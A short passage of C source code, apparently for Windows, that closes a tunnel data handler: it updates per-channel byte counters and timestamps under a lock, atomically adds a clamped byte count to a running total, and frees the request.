        ch = TunnelFindLocked(tm, tunnel_id, channel_id);
        if (ch) {
            ch->bytes_in += (UINT64)req.data.len;
            ch->last_seen = GetTickCount64();
        }
        LeaveCriticalSection(&tm->lock);
        add = (req.data.len > (SIZE_T)0x7FFFFFFF) ? 0x7FFFFFFF : (LONG)req.data.len;
        InterlockedAdd(&tm->wrote_bytes, add);
    }

    TunnelFreeData(&req);
    return TunnelEmptyList();
}
